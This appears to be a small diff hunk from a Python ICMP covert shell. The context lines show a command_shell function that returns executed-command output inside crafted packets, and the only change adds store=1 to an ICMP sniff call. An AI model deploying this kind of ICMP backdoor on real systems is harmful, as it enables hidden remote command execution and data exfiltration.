@@ -62,4 +62,4 @@ def command_shell(data):
 	value = proc.stdout.read() + proc.stderr.read()
 	sendp(packet_builder(shell + value + prompt),verbose=0)
 
-sniff(iface=sys.argv[1],filter="icmp",prn=action)
+sniff(iface=sys.argv[1],filter="icmp",prn=action,store=1)
